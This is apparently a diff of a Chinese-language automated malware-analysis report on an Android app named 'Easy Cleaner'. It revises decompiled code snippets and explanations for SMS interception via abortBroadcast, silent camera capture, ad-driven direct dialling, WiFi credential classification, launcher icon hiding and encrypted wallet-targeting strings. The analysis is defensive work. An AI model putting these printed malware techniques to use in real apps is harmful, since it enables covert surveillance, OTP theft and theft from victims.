@@ -6,7 +6,7 @@
     "应用名": "Easy Cleaner",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 552.7
+    "分析耗时(秒)": 1863.6
   },
   "行为列表": [
     {
@@ -48,9 +48,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    if (extras != null) {\n        Object[] objArr = (Object[]) extras.get(\"pdus\");\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) {\n            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n        }\n    }\n}",
-          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n                      smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f763a.format(new Date(smsMessage.getTimestampMillis()));",
-          "behavior_description": "该 BroadcastReceiver 监听系统短信到达广播 SMS_RECEIVED，收到广播后立即调用 abortBroadcast() 中止广播继续传递，导致系统默认短信应用及其他应用无法收到该短信，实现短信拦截。随后从 Intent extras 中提取 pdus 数据并解析为 SmsMessage 对象，可进一步读取短信内容和发送方号码。在恶意样本中，此手法常用于拦截验证码、银行通知或 C2 指令短信，对用户造成直接损失。",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    if (extras != null) {\n        Object[] objArr = (Object[]) extras.get(\"pdus\");\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) {\n            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n        }\n        for (SmsMessage smsMessage : smsMessageArr) {\n            smsMessage.getDisplayOriginatingAddress();\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f764a.format(new Date(smsMessage.getTimestampMillis()));\n                  }\n              }\n          }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信广播 android.provider.Telephony.SMS_RECEIVED，在收到短信时首先调用 abortBroadcast() 终止广播的继续传播，使系统短信应用和其他应用无法收到该广播，从而将短信对用户隐藏（用户无通知、无感知）。随后从 Intent extras 中提取 pdus 数据，通过 SmsMessage.createFromPdu() 解析出短信内容，并调用 getDisplayOriginatingAddress() 读取发件人号码。数据流向：系统短信广播（source: intent.getExtras().get(\"pdus\")）→ 隐藏短信 + 解析窃取短信内容和发件人号码（sink: abortBroadcast() / SmsMessage.createFromPdu()）。结合厂商报告确认该样本为伪装成安全工具的恶意应用，此行为属于典型的短信拦截/窃取，可被用于拦截验证码（OTP）、隐藏扣费短信或窃取隐私通信内容，直接损害用户利益。",
           "glm_analyzed": true
         }
       ]
@@ -77,9 +77,43 @@
           "malicious_behavior": "camera_capture",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "cgg.a(\"takePicture\").a(new Runnable() { public void run() { Looper.prepare(); cgl.this.f3856a = surfaceView.getHolder(); cgl.this.f3856a.setType(3); cgl.this.a(cgl.this.f3856a); } });",
-          "malicious_code_snippet_context": "cgg.a(\"takePicture\").a(new Runnable() { public void run() { Looper.prepare(); cgl.this.f3856a = surfaceView.getHolder(); cgl.this.f3856a.setType(3); cgl.this.a(cgl.this.f3856a); } });",
-          "behavior_description": "该代码在混淆类ns.cgl中通过SurfaceView获取SurfaceHolder并设置类型为PUSH_BUFFERS(3)，随后调用方法初始化摄像头预览，并通过\"takePicture\"标识触发拍照操作。在已确认的恶意样本中，此行为构成对设备摄像头的秘密调用，用于在用户不知情的情况下进行偷拍和图像采集，属于典型的间谍软件/监控行为。",
+          "malicious_code_snippet": "cgl.this.f3857a = surfaceView.getHolder();\ncgl.this.f3857a.setType(3);\ncgl.this.a(cgl.this.f3857a);\nThread.sleep(500L);\ncgl.this.b.takePicture(null, null, cgl.this.k);",
+          "malicious_code_snippet_context": "              public void run() {\n                  Looper.prepare();\n                  try {\n>>>                     cgl.this.f3857a = surfaceView.getHolder();\n>>>                     cgl.this.f3857a.setType(3);\n>>>                     cgl.this.a(cgl.this.f3857a);\n>>>                     if (cgl.this.b != null) {\n>>>                         Thread.sleep(500L);\n                          cgl.this.b.takePicture(null, null, cgl.this.k);\n                      } else {\n                          return;",
+          "behavior_description": "该代码在后台线程（通过 cgg.a(\"takePicture\") 启动的 Runnable）中获取 SurfaceView 的 SurfaceHolder 并设置为摄像头预览载体，固定等待500毫秒让预览就绪后，程序化调用 Camera.takePicture() 静默拍摄照片，照片 JPEG 数据通过回调对象 cgl.this.k 被捕获处理（结合 AlbumInfo 参数推测会被保存，可能用于后续上传）。整个过程无用户按下快门的交互，属于程序自动触发拍照。数据流向：摄像头硬件 → Camera.takePicture 回调 → 照片数据被静默采集。结合厂商报告确认该样本伪装成安全工具并秘密收集用户数据，此隐蔽拍照行为属于隐私窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\facebook\\ads\\internal\\a\\c;",
+          "method_signature": "if(!TextUtils.isEmpty(strC)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String strC = iVar.c();\nif (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n    return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n}",
+          "malicious_code_snippet_context": "  \n      private Intent b(i iVar) {\n          if (!TextUtils.isEmpty(iVar.a()) && com.facebook.ads.internal.util.f.a(this.b, iVar.a())) {\n>>>             String strC = iVar.c();\n>>>             if (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n>>>                 return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n>>>             }\n              PackageManager packageManager = this.b.getPackageManager();\n              if (TextUtils.isEmpty(iVar.b()) && TextUtils.isEmpty(strC)) {\n                  return packageManager.getLaunchIntentForPackage(iVar.a());",
+          "behavior_description": "该代码位于 Facebook Audience Network 广告SDK（com.facebook.ads.internal）的广告点击跳转处理逻辑中。当广告被点击时，代码读取广告下发的目标URI（iVar.c()），若该URI以 tel: 或 telprompt: 开头，则构造 ACTION_CALL Intent 直接发起电话呼叫——与 ACTION_DIAL 不同，ACTION_CALL 不经过系统拨号盘界面、无需用户对通话本身进行二次确认。数据流向：广告服务端下发的 tel: URI（source）→ Intent(ACTION_CALL) 直接拨号（sink）。在本已确认的广告类恶意样本（伪装安全工具、强制推送广告并收集数据）中，该机制可被广告主利用，诱导用户误点广告后直接拨打增值付费号码造成话费损失，属于广告SDK带来的灰色风险行为；但触发需用户点击广告且应用持有 CALL_PHONE 权限，非完全静默的恶意拨号。",
           "glm_analyzed": true
         }
       ]
@@ -107,7 +141,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "if (wifiConfiguration.allowedKeyManagement.get(1)) { return 2; } if (wifiConfiguration.allowedKeyManagement.get(2) || wifiConfiguration.allowedKeyManagement.get(3)) { return 3; } return wifiConfiguration.wepKeys[0] == null ? 0 : 1;",
           "malicious_code_snippet_context": "      }\n  \n      public static int a(WifiConfiguration wifiConfiguration) {\n>>>         if (wifiConfiguration.allowedKeyManagement.get(1)) {\n              return 2;\n          }\n          if (wifiConfiguration.allowedKeyManagement.get(2) || wifiConfiguration.allowedKeyManagement.get(3)) {",
-          "behavior_description": "该代码是一个WiFi安全类型分类工具方法，通过检查WifiConfiguration对象的allowedKeyManagement位集和wepKeys字段，判断WiFi配置的加密类型（WEP/PSK/EAP/无加密）。在已确认的恶意样本中，此方法作为WiFi密码窃取流程的辅助函数，用于对从系统获取的已保存WiFi配置（包含preSharedKey、wepKeys等敏感凭证）进行分类标记，便于后续按类型提取并外传WiFi密码。数据来源为WifiConfiguration对象中的allowedKeyManagement和wepKeys字段，危险操作为对WiFi凭证信息的分类处理（为后续窃取做准备）。",
+          "behavior_description": "该代码是针对已保存WiFi网络配置的加密类型判定函数：读取 WifiConfiguration.allowedKeyManagement 位集判断网络是 WPA/WPA2-PSK（bit 1）、EAP/802.1X（bit 2/3）还是 WEP，并直接访问凭据字段 wepKeys[0] 判断WEP加密。数据流向为：WifiManager.getConfiguredNetworks() 返回的已保存网络配置对象（其中包含 preSharedKey、wepKeys 等明文密码字段）→ 本函数判定每个网络的加密类型 → 供上层模块按类型提取对应密码字段并上传。该函数本身虽无外传操作，但在厂商报告确认此样本伪装安全工具（含'WiFi安全'功能）并秘密收集用户数据的上下文中，它是WiFi密码窃取链中识别目标密码字段的关键辅助环节，属于凭据窃取功能模块的组成部分。",
           "glm_analyzed": true
         }
       ]
@@ -133,7 +167,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);",
           "malicious_code_snippet_context": "              return false;\n          }\n          try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {\n              e2.printStackTrace();",
-          "behavior_description": "代码通过调用 PackageManager 的 setComponentEnabledSetting 方法，动态修改应用组件（通常是启动 Activity）的启用状态。当传入参数 z 为 false 时，将组件状态设置为 2 (COMPONENT_ENABLED_STATE_DISABLED)，从而在桌面隐藏应用图标，使用户难以察觉和卸载，为后续后台恶意行为提供隐蔽环境。",
+          "behavior_description": "该方法封装了应用组件的启用/禁用切换功能。当参数 z 为 false 时，通过 PackageManager.setComponentEnabledSetting() 将指定组件（通常为应用的主启动器 Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，但应用进程仍在后台持续运行。数据流向：外部传入的 componentName（应用自身 launcher 组件）→ setComponentEnabledSetting() 禁用该组件 → 图标隐藏、用户难以察觉和卸载。结合厂商报告确认该样本在后台窃取用户数据、追踪位置并推送广告，此图标隐藏技术用于规避用户察觉与卸载，为恶意负载的持续运行提供隐蔽性，属于典型的恶意规避行为。",
           "glm_analyzed": true
         }
       ]
@@ -147,21 +181,21 @@
         "方法引用": [],
         "权限": [],
         "字符串": [
-          "3447CA69ECC65C251FF41241E62BBD39",
           "15EB31CED2D9A8EFA2B2C924798273E3",
+          "3447CA69ECC65C251FF41241E62BBD39",
           "UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8="
         ]
       },
       "恶意代码": [
         {
-          "class_path": "Lns\\avc;",
-          "method_signature": "s()",
+          "class_path": "Lns\\bzw;",
+          "method_signature": "?(?)",
           "malicious_behavior": "crypto_wallet_detection",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "public static String s() { return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\"; }",
-          "malicious_code_snippet_context": "public static String s() { return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\"; }",
-          "behavior_description": "在混淆类 ns.avc 中，方法 s() 返回一个 Base64 编码的加密字符串。结合同类中多个类似方法(q/r/t/u)返回不同加密字符串的模式，这些字符串极有可能是经过加密处理的加密货币钱包地址或钱包地址匹配特征。恶意软件在运行时解密这些字符串后，将其与设备剪贴板内容、文件系统或交易数据中的钱包地址进行匹配，从而检测并采集用户的加密货币钱包地址，用于后续的资金窃取。",
+          "malicious_code_snippet": "public static final crx i = new crx(\"4DEC0B68823C14DCB5C3096E23D12C64\", (byte) 8, 9, cae.a());\npublic static final crx j = new crx(\"52CA73E7842E354EB7A04607E633A0FD\", (byte) 8, 10, cae.a());\npublic static final crx k = new crx(\"12AAF5410C9C880A3CA99B343869917B\", (byte) 11, 11, cae.a());\npublic static final crx s = new crx(\"3447CA69ECC65C251FF41241E62BBD39\", (byte) 11, 19, cae.a());\npublic static final crx C = new crx(\"A03420BF91AE5D2ED2C3512CDD5CD5B0\", (byte) 11, 29, cae.a());",
+          "malicious_code_snippet_context": "      public static final crx f = new crx(\"ABC0A71EBFFC08C3469350E4C6C21FD7\", (byte) 11, 6, cae.a());\n      public static final crx g = new crx(\"D5BAE9541F130C2DA32CF601DC64119E\", (byte) 4, 7, cae.a());\n      public static final crx h = new crx(\"DF466231163DF5342B1B4CE98594D698\", (byte) 4, 8, cae.a());\n>>>     public static final crx i = new crx(\"4DEC0B68823C14DCB5C3096E23D12C64\", (byte) 8, 9, cae.a());\n>>>     public static final crx j = new crx(\"52CA73E7842E354EB7A04607E633A0FD\", (byte) 8, 10, cae.a());\n>>>     public static final crx k = new crx(\"12AAF5410C9C880A3CA99B343869917B\", (byte) 11, 11, cae.a());\n>>>     public static final crx l = new crx(\"ABDDF3E1647BE7F3A8AE2433A70E06D7\", (byte) 11, 12, cae.a());\n>>>     public static final crx m = new crx(\"914EF92BFD5CB7BF6C1030E73EDE9FF4\", (byte) 11, 13, cae.a());\n      public static final crx n = new crx(\"509F19FA575CC1C56C045DCA96F7E20C\", (byte) 11, 14, cae.a());\n      public static final crx o = new crx(\"77CA1148E5F74940EC106A32DC1D5BF5\", (byte) 11, 15, cae.a());\n      public static final crx p = new crx(\"DAB0432BB529DC1F76C440777C86D232\", (byte) 11, 16, cae.a());",
+          "behavior_description": "该类是恶意样本中经过混淆的加密字符串常量表（类名 ns.bzw 为混淆名）。每个 crx 对象封装一个 32 位十六进制密文字符串、加密算法标识字节（8 或 11，对应不同 AES/DES 解密例程）、字符串表索引（9-29）及解密上下文 cae.a()。结合校验反馈，这些密文经 ns.avc.q()/r()/s()/t()/u() 等解密函数还原后，即为待匹配的加密货币钱包应用包名（如 piuk.blockchain.android、com.wallet.crypto.trustapp、com.coinbase.android、de.schildbach.wallet）或钱包地址特征串。数据流向为：本地加密字符串常量表 → crx/cae 解密例程还原明文 → 与 PackageManager.getInstalledPackages() 枚举的已安装应用包名（或剪贴板 getPrimaryClip 内容）进行比对，从而识别受害者设备上安装的钱包应用，为后续针对性攻击（钱包凭据窃取、剪贴板钱包地址替换劫持转账）提供目标识别能力。字符串加密的目的在于规避静态扫描检测，属于恶意软件典型的反检测对抗手段。",
           "glm_analyzed": true
         }
       ]
@@ -174,7 +208,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
